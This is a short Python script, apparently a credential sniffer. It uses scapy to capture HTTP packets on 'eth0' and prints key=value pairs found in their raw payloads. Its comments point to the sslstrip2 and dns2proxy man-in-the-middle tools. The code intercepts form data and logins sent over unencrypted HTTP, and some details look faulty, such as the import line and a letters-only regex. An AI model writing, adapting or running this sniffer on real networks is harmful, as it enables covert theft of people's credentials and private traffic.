from scapy.all import scapy,sniff
from scapy.layers.http import *
import re

def listen_packets(interface):
    sniff(iface=interface,store=False,prn=analyze_packets)
    # prn callback function

def analyze_packets(packet):
    # https://github.com/byt3bl33d3r/sslstrip2
    # https://github.com/singe/dns2proxy
    # packet.show()
    if packet.haslayer(HTTP):
        if packet.haslayer(Raw):
            p = packet[Raw].load
            f = re.findall(r"([a-zA-Z]+=[a-zA-Z]+)", str(p))
            if len(f) != 0:
                print(f)


listen_packets('eth0')